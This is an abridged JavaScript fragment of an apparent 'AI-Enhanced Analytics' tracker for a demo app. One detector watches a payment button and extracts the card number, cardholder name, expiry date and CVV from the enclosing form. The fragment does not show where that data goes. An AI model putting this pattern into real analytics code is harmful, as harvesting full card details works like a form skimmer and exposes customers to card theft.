(function(root, factory) {
  ...
  class AnalyticsTracker {
    constructor() {
      ...
      this.config = {
        appKey: 'demo-test-apps-2025-10-05-w4r63mst8ys',
      ...
      this.componentDetectors = [
        ...
        {
            name: 'PaymentSubmitButton',
            type: 'button',
            selectors: [".block.w-full.bg-blue-600.text-white.py-3.rounded-lg.hover:bg-blue-700.transition-colors"],
            purpose: 'Submit payment information',
            contextNeeded: ["card_number","card_name","expiry_date","cvv"],
            contextCollection: {"search_parents":["form"],"extract_fields":["card_number","card_name","expiry_date","cvv"],"sibling_context":[],"data_attributes":[]}
        },
    ...
    initAutoTracking() {
      console.log('🤖 AI-Enhanced Analytics initialized for demo-test-apps-2025-10-05-w4r63mst8ys');
